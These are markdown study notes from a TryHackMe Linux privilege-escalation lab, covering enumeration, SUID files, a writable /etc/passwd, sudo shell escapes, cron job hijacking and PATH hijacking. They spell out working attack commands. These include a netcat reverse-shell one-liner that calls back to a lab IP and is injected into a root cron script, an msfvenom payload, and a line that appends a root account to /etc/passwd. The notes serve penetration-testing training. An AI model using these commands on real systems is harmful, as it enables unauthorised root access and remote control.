# PrivEsc

* [Room - PrivEsc](https://tryhackme.com/room/commonlinuxprivesc)

## Introduction

* Horizontal Privilege Escalation

* Vertical Privilege Escalation

---

## Enumeration

* `LinEnum` is a simple bash script that performs common commands related to privilege escalation

    * [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

    * `python -m SimpleHTTPServer 8000`

    * `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

    * `curl -sLO https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

* `LinEnum Output`

    * __Kernel__ - Are there any `CVE`s for this kernel version.

    * __Files__ -  The `world-writable` files are shown below.

    * __SUID Files__ - `SUID` (Set owner User ID up on execution) is a file permission that allows the file to run with permissions of whoever the owner is.

    * __Crontab__ - `Schedule commands` at a specific time. What user does the command execute as? Does it read command information from a file?

* `hostname`

* `cat /etc/passwd | grep -E '^user[0-9].' | wc -l`

* `cat /etc/shells`

* `crontab -l`
* `cat /etc/crontab`

> `less -R` for `raw encode content` (e.g. colourize the output instead of showing the escape codes).

---

## Exploiting SUID/GUID Files

1. The first step in Linux privilege escalation exploitation is to check for files with the `SUID/GUID` bit set. 

    * This means that the file or files can be run with the permissions of the file(s) owner/group.

* __Permission Flags__

    * __Normal Bits__

        * Standard Permissions are `3 bit` per `owner`, `group` and `other`
            
            * _execute_ : `1`
            * _write_ : `2`
            * _read_ : `4`

        * Maximum of all bits set is `7`.
    
    * __Special Bits__

        * `SUID` : When bit `4` is set. `rws-rwx-rwx`
        * `SGID` : When bit `2` is set. `rwx-rws-rwx`

* Look for the `s` bit being set: `rws-rwx-rwx` / `rwx-rws-rwx`

    * `find / -perm -u=s -type f 2>/dev/null`

        * `-perm` - searches for files with specific permissions
        * `-u=s` searches for user `set user id` bit.

    * `/home/user3/shell` could be exploited.

---

## Exploiting writeable /etc/passwd

* User is member of `root` group and `/etc/passwd` has `write` permissions.

* `/etc/passwd` file stores essential information for login.

* `/etc/passwd` file __should__ have general `read` permission.

* `/etc/passwd` file __should__ have root `write` permission.

* `/etc/passwd` format

    * `test:x:0:0:root:/root:/bin/bash`
    * `username:password:uid:gid:user-info-txt:home-dir:shell-path`

* __Create a new root user entry with a known password__

    > `openssl passwd -1 -salt [salt] [password]`
    * `openssl passwd -1 -salt new 123` (`$1$new$p7ptkEKU1HnaHpRtzNizS1`)
    * `echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd`

---

## Exploiting `sudo`

* Use `sudo -l` to list what commands you're able to use as a super user on that account. This might be used to compromise the system.

* `sudo vi` - Open `vi` with `sudo`.
* `:`+ `!sh` - Use  `vi` to open a new shell.

---

## Exploiting `crontab`

* The Cron daemon is a long-running process that executes commands at specific dates and times. 
* You can use this to schedule activities, either as one-time events or as recurring tasks. 
* You can create a crontab file containing commands and instructions for the Cron daemon to execute.

* `cat /etc/crontab`

* __Format of a Cronjob__

    ```bash
    # m  h  dom mon dow user	command
    */5  *  *   *   *   root    /home/user4/Desktop/autoscript.sh
    17   *	*   *   *	root    cd / && run-parts --report /etc/cron.hourly
    25   6	*   *   *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47   6	*   *   7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52   6	1   *   *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    ```
* `msfvenom`

    * [msfvenom - Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
    * [msfvenom - GitHub](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
    * [msfvenom -Cheat Sheet](https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/)

    * `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`

         * `mkfifo /tmp/ekvsqgg; nc 10.10.250.198 8888 0</tmp/ekvsqgg | /bin/sh >/tmp/ekvsqgg 2>&1; rm /tmp/ekvsqgg`


1. Set up attacking machine listener

    * `nc -lvp 8888`

2. Add reverse-shell exploit to vulnerable cron job.

    * `echo mkfifo /tmp/ekvsqgg; nc 10.10.250.198 8888 0</tmp/ekvsqgg | /bin/sh >/tmp/ekvsqgg 2>&1; rm /tmp/ekvsqgg > vuln.sh`

---

## Exploiting $PATH

1. We have a `SUID` binary. On execution is executing a command e.g. `ps`.

2. Modify the `$PATH` variable to use different command named `ps` that we control.

* `cd tmp`
* `echo "/bin/bash" > ls`
* `chmod +x ls`
* `export PATH=/tmp:$PATH`

---

## References

* https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
* https://payatu.com/guide-linux-privilege-escalation

* [PrivEsc Playground - Try Hack Me](https://tryhackme.com/room/privescplayground)



